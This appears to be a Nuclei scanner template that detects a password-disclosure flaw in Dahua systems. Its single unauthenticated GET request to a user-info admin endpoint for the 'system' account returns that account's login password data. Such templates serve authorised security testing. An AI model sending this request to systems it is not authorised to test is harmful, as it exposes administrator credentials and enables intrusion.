id: dahua-user-getuserinfobyusername-getpassword
info:
  name: 大华 - 密码信息泄露漏洞
  author: secking
  severity: medium
  reference:
    - https://www.dahuatech.com/
  metadata:
    verified: true
    max-request: 1
    vendor: dahua
    product: dahua
  tags: info-leak,vuln,dahua
http:
  - method: GET
    path:
      - '{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "\"loginName\":\"system\",\"loginPass\"")'
